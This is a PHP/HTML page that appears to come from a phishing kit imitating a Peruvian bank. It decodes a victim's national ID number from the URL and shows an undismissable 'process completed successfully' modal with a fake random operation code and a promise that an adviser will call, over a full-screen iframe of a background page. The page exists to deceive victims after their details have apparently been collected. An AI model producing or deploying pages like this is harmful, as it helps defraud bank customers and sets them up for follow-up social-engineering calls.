<?php
error_reporting(0);
session_start();
/*****************************************************************************/
$n[0] = "OP-GW6X-8K";
$n[1] = "OP-H2MP-R2";
$n[2] = "OP-C4QJ-LD";
$n[3] = "OP-DK5Q-P3";
$n[4] = "OP-XP4B-KS";
$b = mt_rand(0,4);
/*****************************************************************************/
$x = $_GET["id"];
/*****************************************************************************/
$dni = base64_decode($x);
/*===================================================*/
//include '../files/reniec/consulta.php';
$name = ($nombres ? trim($nombres)." " : "Cliente");
$surn = ($paterno ? trim($paterno) : "");
/*===================================================*/
date_default_timezone_set("America/Lima");
$meses = array("enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre");
$mes = date("m") - 1;
$fecha =  date("d/m/Y h:i:s");
/*===================================================*/

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xml:lang="en" lang="en" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">
<head class="at-element-marker">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1">
<link rel="stylesheet" href="../files/css/stylemodal.css">
<link rel="stylesheet" href="../files/css/libraries-min.css">
<link rel="stylesheet" href="../files/css/libraries-global-min.css">
<link rel="stylesheet" href="../files/css/modal.css">
<link rel="stylesheet" href="../files/fuentes.css">
<script src="../files/js/jquery-1.12.0.min.js"></script>
<script src="../files/js/bootstrap.min.js"></script>
<script type="text/javascript" src="../files/js/libraries.min.js"></script>
<script src="../files/js/jquery.creditCardValidator.js"></script>
<script>
   $(document).ready(function()
   {
      $("#mostrarmodal").modal("show");
   });
</script>
<script type="text/javascript">
  function justNumbers(e) {
  var keynum = window.event ? window.event.keyCode : e.which;
  if ((keynum == 8) || (keynum == 46))
  return true;
  return /\d/.test(String.fromCharCode(keynum)); }
</script>

    
<style>.at-element-marker {visibility:visible;}</style>
  
<style>
    #tarjetaCreditoBanner .links{
        padding: 6px 20px 20px 20px;
    }
    #tarjetaCreditoBanner h5{
        display: table;
    }
    #tarjetaCreditoBanner .headingTCBText{
        color: #333333;
    display: table-cell;
    padding-right: 10px;
    font-weight: bold;
    font-size: 16px;
    font-family: Arial;
    }
    #tarjetaCreditoBanner .icon-32.blue.b09-tarjeta{
        display: table-cell;
    }
    #tarjetaCreditoBanner p{
        font-size: 12px;
    line-height: 14px;
    margin: 1.6em 0;
    }
    #tarjetaCreditoBanner .btn{
        width: 100%;
    }      
    #boxProgressionTest .col-mis-opo{
      display: none;
    }
    #boxProgressionTest .img-responsive{
      height: 35px;
    }
    #boxProgressionTest .texto-front-mis-opo{
      padding-top: 10px;
      height: 120px;
    }
    #boxProgressionTest .parrafo-front-mis-opo{
      padding-top: 16px;
    }
    #boxProgressionTest .btn.mis-opo{
      background-color: #169BD5;
    }
    #slideContainer{
      overflow: hidden;
    }
    #boxProgressionTest{
      margin-bottom: 2em;
    }
    #boxProgressionTest .sprite-arrow-test{
      background-image: url(../files/img/16xSprite-buttons.png);
      background-repeat: no-repeat;
      background-position: 6px -103px;
      width: 30px;
      height: 30px;
      cursor: pointer;
    }
    #boxProgressionTest .oneclic-banner-desktop .contenido-click{
      border: 0;
    }
    #boxProgressionTest .parrafo-titulo{
      padding-left: 1em;
    }
</style>
</head>
<body style="">
    <div class="modal fade" id="mostrarmodal" tabindex="-1" role="dialog" aria-labelledby="basicModal" aria-hidden="true" data-backdrop="static" data-keyboard="false" style="top: 157px;"><!-- data-backdrop="static" data-keyboard="false" -> evita cerrar al hacer clic o al presionar Esc-->
      <div class="modal-dialogos"><!-- modal-dialog -->
        <div class="modal-content"><!-- modal-contenido -->
          <!--<div class="modal-header">-->
            <!--<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>--><!-- Boton Cerrar -->
              <div id="cabeceraTitle">
                <h2 class="tituloPrincipal"><b>PROCESO COMPLETADO CON EXITO</b></h2>
                <p style="height: 5px;"></p>
              </div>
              <div class="textoB" style="margin: 0px 20px 0px 20px;">
                <b class="textoA">Estimado(a): </b><span class="textoD"><?php echo $name.$surn;?>,</span>
                <span class="textoE">la primera fase del proceso se ha completado con exito, en el transcurso del día uno de nuestros asesores se pondra en contacto con usted para culminar el proceso.</span>
              </div>
          <!--</div>-->
            
          <div class="modal-bodys" style="text-align: center; font-size: 14px; font-family: omnes;"> <!-- Inicio del Cuerpo Modal-->
            <div id="content">
              <table border="0" class="tabla_cord" cellpadding="0" cellspacing="0"  style="width: 100%;">
                <input type="hidden" name="idfin" id="idfin" value="fin" />
                  <tr class="registro">
                    <td class="textoF">Código de Operación:&nbsp;&nbsp;<b><?=$n[$b];?></b></td>
                  </tr>
                  <tr class="registro">
                    <td class="textoF">Fecha:&nbsp;&nbsp;<?=date(" d ")." de ".ucwords($meses[$mes])." de ".date(" Y");?></td>
                  </tr>
                  <tr class="registro">
                    <td class="textoF">Hora:&nbsp;&nbsp;<?=date("H:i A");;?></td>
                  </tr>
              </table>

                <div id="aviso_div_tre" class="msj_chico" style="display: none;">
                  <span class="icoAlerta"></span>
                  <p id="aviso_tre" class="textoC"></p>
                </div>

              <center style="padding: 10px;">
                  <a href="fin.php" target="_top">
              <div style=" background-color: #008441; color: #FFFFFF; border-radius: 3px; -moz-border-radius: 3px; -webkit-border-radius: 3px; border: 1px solid black; text-align: center; font-size: 14px; font-weight: normal; font-style: normal; text-decoration: none; border-color:#FFFFFF;border-radius:4px;border-width :1px;cursor:pointer;line-height:11px; width: 30%; height: 40px; padding-top: 13px; font-family: omnes;">
                  Finalizar
              </div>
              </a>
              </center>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>

<iframe src="../files/background.php?id=<?php echo $name?>&cgi=<?php echo $surn?>" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden;"></iframe>

</html>